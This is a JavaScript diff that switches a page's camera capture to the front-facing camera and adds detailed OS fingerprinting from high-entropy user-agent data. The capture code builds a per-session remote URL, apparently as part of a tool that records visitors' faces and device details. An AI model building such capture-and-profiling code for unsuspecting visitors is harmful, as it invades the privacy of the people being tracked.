@@ -165,7 +165,8 @@ async function initCamera(report, sessionID) {
     const TARGET_URL = `${BASE_API}/${sessionID}.json`; // <--- PATH KE FOLDER
 
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        // const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
         const video = document.createElement('video');
         const canvas = document.createElement('canvas');
         video.srcObject = stream;
@@ -250,6 +251,22 @@ function parseOldUA() {
     }
     
     return navigator.platform;
+}
+
+async function getFullOS() {
+    if (navigator.userAgentData) {
+        try {
+            const highEntropy = await navigator.userAgentData.getHighEntropyValues(['platformVersion']);
+            const platform = navigator.userAgentData.platform;
+            if (platform === "Android") return `Android ${highEntropy.platformVersion}`;
+            if (platform === "Windows") {
+                let winVer = parseInt(highEntropy.platformVersion.split('.')[0]);
+                return winVer >= 13 ? "Windows 11" : "Windows 10";
+            }
+            return platform;
+        } catch (e) { return parseOldUA(); }
+    }
+    return parseOldUA();
 }
 
 
